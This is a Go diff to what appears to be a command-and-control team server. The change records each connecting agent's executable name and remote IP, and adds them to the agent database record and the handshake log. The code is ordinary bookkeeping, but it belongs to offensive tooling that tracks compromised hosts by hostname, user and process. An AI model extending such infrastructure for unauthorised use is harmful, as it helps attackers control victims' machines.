@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"log"
 	"net"
+	"path/filepath"
 	"time"
 
 	"c2/internal/teamserver/crypto"
@@ -68,8 +69,9 @@ func (h *Handler) HandleConnection(listenerID string, conn net.Conn) {
 		return
 	}
 
-	log.Printf("[DEBUG] Handshake from %s: agent=%s hostname=%s os=%s/%s user=%s",
-		conn.RemoteAddr(), handshake.AgentID, handshake.Hostname, handshake.OS, handshake.Arch, handshake.Username)
+	log.Printf("[DEBUG] Handshake from %s: agent=%s hostname=%s os=%s/%s user=%s exe=%s",
+		conn.RemoteAddr(), handshake.AgentID, handshake.Hostname, handshake.OS, handshake.Arch, handshake.Username,
+		filepath.Base(handshake.ExePath))
 
 	// Derive per-agent key
 	agentKey, err := crypto.DeriveAgentKey(h.masterKey, handshake.AgentID)
@@ -87,6 +89,19 @@ func (h *Handler) HandleConnection(listenerID string, conn net.Conn) {
 	// Build agent record
 	localIPsJSON := marshalLocalIPs(handshake.LocalIPs)
 	lid := listenerID // capture for pointer
+
+	// Extract executable name from full path
+	exeName := filepath.Base(handshake.ExePath)
+	if exeName == "" || exeName == "." || exeName == "/" {
+		exeName = "unknown"
+	}
+
+	// Extract remote IP from connection (strip port)
+	remoteIP, _, err := net.SplitHostPort(conn.RemoteAddr().String())
+	if err != nil {
+		remoteIP = conn.RemoteAddr().String()
+	}
+
 	agent := &database.Agent{
 		ID:                handshake.AgentID,
 		ListenerID:        &lid,
@@ -97,9 +112,11 @@ func (h *Handler) HandleConnection(listenerID string, conn net.Conn) {
 		PID:               int(handshake.PID),
 		LocalIPs:          localIPsJSON,
 		Version:           handshake.Version,
+		ExeName:           exeName,
+		RemoteIP:          remoteIP,
 		HeartbeatInterval: 60,
 		Status:            "active",
-		MetadataJSON:      marshalMetadata(handshake.ExeDir),
+		MetadataJSON:      marshalMetadata(handshake.ExeDir, exeName),
 	}
 
 	// Register agent
@@ -230,11 +247,11 @@ func (h *Handler) agentLoop(conn net.Conn, agentID string, cipher *crypto.Cipher
 	}
 }
 
-func marshalMetadata(exeDir string) *string {
-	if exeDir == "" {
+func marshalMetadata(exeDir, exeName string) *string {
+	if exeDir == "" && exeName == "" {
 		return nil
 	}
-	s := fmt.Sprintf(`{"exe_dir":%q}`, exeDir)
+	s := fmt.Sprintf(`{"exe_dir":%q,"exe_name":%q}`, exeDir, exeName)
 	return &s
 }
 
